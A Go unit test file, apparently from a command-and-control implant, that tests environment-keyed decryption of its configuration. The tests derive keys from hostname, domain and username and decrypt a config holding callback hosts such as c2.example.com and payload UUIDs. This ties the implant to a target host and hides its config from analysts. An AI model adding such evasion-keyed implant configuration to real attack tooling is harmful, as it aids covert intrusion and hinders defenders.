package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"testing"
)

func TestDeriveEnvironmentKey_Hostname(t *testing.T) {
	key := deriveEnvironmentKey("hostname")
	if key == nil {
		t.Fatal("expected non-nil key for hostname method")
	}
	if len(key) != 32 {
		t.Fatalf("expected 32-byte key, got %d", len(key))
	}
}

func TestDeriveEnvironmentKey_EmptyMethod(t *testing.T) {
	key := deriveEnvironmentKey("")
	if key != nil {
		t.Fatal("expected nil key for empty method")
	}
}

func TestDeriveEnvironmentKey_InvalidMethod(t *testing.T) {
	key := deriveEnvironmentKey("invalid")
	if key != nil {
		t.Fatal("expected nil key for method with no matching components")
	}
}

func TestDeriveEnvironmentKey_Deterministic(t *testing.T) {
	key1 := deriveEnvironmentKey("hostname")
	key2 := deriveEnvironmentKey("hostname")
	if key1 == nil || key2 == nil {
		t.Fatal("keys should not be nil")
	}
	for i := range key1 {
		if key1[i] != key2[i] {
			t.Fatal("same method on same host should produce identical keys")
		}
	}
}

func TestDeriveEnvironmentKey_DifferentMethods(t *testing.T) {
	keyH := deriveEnvironmentKey("hostname")
	keyU := deriveEnvironmentKey("username")
	if keyH == nil || keyU == nil {
		t.Fatal("keys should not be nil")
	}
	same := true
	for i := range keyH {
		if keyH[i] != keyU[i] {
			same = false
			break
		}
	}
	if same {
		t.Fatal("different methods should produce different keys (unless hostname == username)")
	}
}

func TestDeriveEnvironmentKey_CompoundMethods(t *testing.T) {
	keyHD := deriveEnvironmentKey("hostname+domain")
	keyHDU := deriveEnvironmentKey("hostname+domain+username")
	if keyHD == nil || keyHDU == nil {
		t.Fatal("compound method keys should not be nil")
	}
	same := true
	for i := range keyHD {
		if keyHD[i] != keyHDU[i] {
			same = false
			break
		}
	}
	if same {
		t.Fatal("different compound methods should produce different keys")
	}
}

func TestEnvDeriveDecrypt_RoundTrip(t *testing.T) {
	key := make([]byte, 32)
	copy(key, sha256sum([]byte("test-key")))

	plaintext := []byte(`{"callbackHost":"http://example.com","payloadUUID":"abc-123"}`)

	encrypted, err := testEnvDeriveEncrypt(key, plaintext)
	if err != nil {
		t.Fatalf("encrypt failed: %v", err)
	}

	decrypted := envDeriveDecrypt(key, encrypted)
	if decrypted == nil {
		t.Fatal("decrypt returned nil")
	}
	if string(decrypted) != string(plaintext) {
		t.Fatalf("decrypt mismatch: got %q, want %q", decrypted, plaintext)
	}
}

func TestEnvDeriveDecrypt_WrongKey(t *testing.T) {
	correctKey := make([]byte, 32)
	copy(correctKey, sha256sum([]byte("correct-key")))
	wrongKey := make([]byte, 32)
	copy(wrongKey, sha256sum([]byte("wrong-key")))

	plaintext := []byte(`{"callbackHost":"http://c2.example.com"}`)

	encrypted, err := testEnvDeriveEncrypt(correctKey, plaintext)
	if err != nil {
		t.Fatalf("encrypt failed: %v", err)
	}

	decrypted := envDeriveDecrypt(wrongKey, encrypted)
	if decrypted != nil {
		t.Fatal("decrypt with wrong key should return nil")
	}
}

func TestEnvDeriveDecrypt_TruncatedCiphertext(t *testing.T) {
	decrypted := envDeriveDecrypt(make([]byte, 32), []byte{1, 2, 3})
	if decrypted != nil {
		t.Fatal("truncated ciphertext should return nil")
	}
}

func TestEnvDeriveDecrypt_EmptyCiphertext(t *testing.T) {
	decrypted := envDeriveDecrypt(make([]byte, 32), nil)
	if decrypted != nil {
		t.Fatal("nil ciphertext should return nil")
	}
}

func TestDeobfuscateEnvDerived_Disabled(t *testing.T) {
	envKeyDerive = ""
	envDerivedBlob = ""
	if !deobfuscateEnvDerived() {
		t.Fatal("should return true when disabled")
	}
}

func TestDeobfuscateEnvDerived_CorrectHost(t *testing.T) {
	method := "hostname"
	key := deriveEnvironmentKey(method)
	if key == nil {
		t.Fatal("key derivation failed")
	}

	configMap := map[string]string{
		"payloadUUID":  "test-uuid-1234",
		"callbackHost": "http://192.168.1.100",
		"callbackPort": "443",
		"encryptionKey": "aes-key-here",
	}
	jsonBytes, _ := json.Marshal(configMap)

	encrypted, err := testEnvDeriveEncrypt(key, jsonBytes)
	if err != nil {
		t.Fatalf("encrypt failed: %v", err)
	}
	zeroBytes(key)

	// Save original values
	origUUID := payloadUUID
	origHost := callbackHost
	origPort := callbackPort
	origEncKey := encryptionKey
	defer func() {
		payloadUUID = origUUID
		callbackHost = origHost
		callbackPort = origPort
		encryptionKey = origEncKey
		envKeyDerive = ""
		envDerivedBlob = ""
	}()

	envKeyDerive = method
	envDerivedBlob = base64.StdEncoding.EncodeToString(encrypted)

	if !deobfuscateEnvDerived() {
		t.Fatal("should succeed with correct host key")
	}

	if payloadUUID != "test-uuid-1234" {
		t.Fatalf("payloadUUID not set: got %q", payloadUUID)
	}
	if callbackHost != "http://192.168.1.100" {
		t.Fatalf("callbackHost not set: got %q", callbackHost)
	}
	if callbackPort != "443" {
		t.Fatalf("callbackPort not set: got %q", callbackPort)
	}
	if encryptionKey != "aes-key-here" {
		t.Fatalf("encryptionKey not set: got %q", encryptionKey)
	}
}

func TestDeobfuscateEnvDerived_WrongHost(t *testing.T) {
	wrongKey := make([]byte, 32)
	copy(wrongKey, sha256sum([]byte("fawkes-env-derive:wrong-hostname")))

	configMap := map[string]string{"payloadUUID": "should-not-see-this"}
	jsonBytes, _ := json.Marshal(configMap)

	encrypted, _ := testEnvDeriveEncrypt(wrongKey, jsonBytes)

	origDerive := envKeyDerive
	origBlob := envDerivedBlob
	defer func() {
		envKeyDerive = origDerive
		envDerivedBlob = origBlob
	}()

	envKeyDerive = "hostname"
	envDerivedBlob = base64.StdEncoding.EncodeToString(encrypted)

	if deobfuscateEnvDerived() {
		t.Fatal("should fail with wrong host key")
	}
}

func TestDeobfuscateEnvDerived_InvalidBase64(t *testing.T) {
	origDerive := envKeyDerive
	origBlob := envDerivedBlob
	defer func() {
		envKeyDerive = origDerive
		envDerivedBlob = origBlob
	}()

	envKeyDerive = "hostname"
	envDerivedBlob = "not-valid-base64!!!"

	if deobfuscateEnvDerived() {
		t.Fatal("should fail with invalid base64")
	}
}

// testEnvDeriveEncrypt mirrors the builder-side encryption for test purposes.
func testEnvDeriveEncrypt(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func sha256sum(data []byte) []byte {
	h := sha256.Sum256(data)
	return h[:]
}
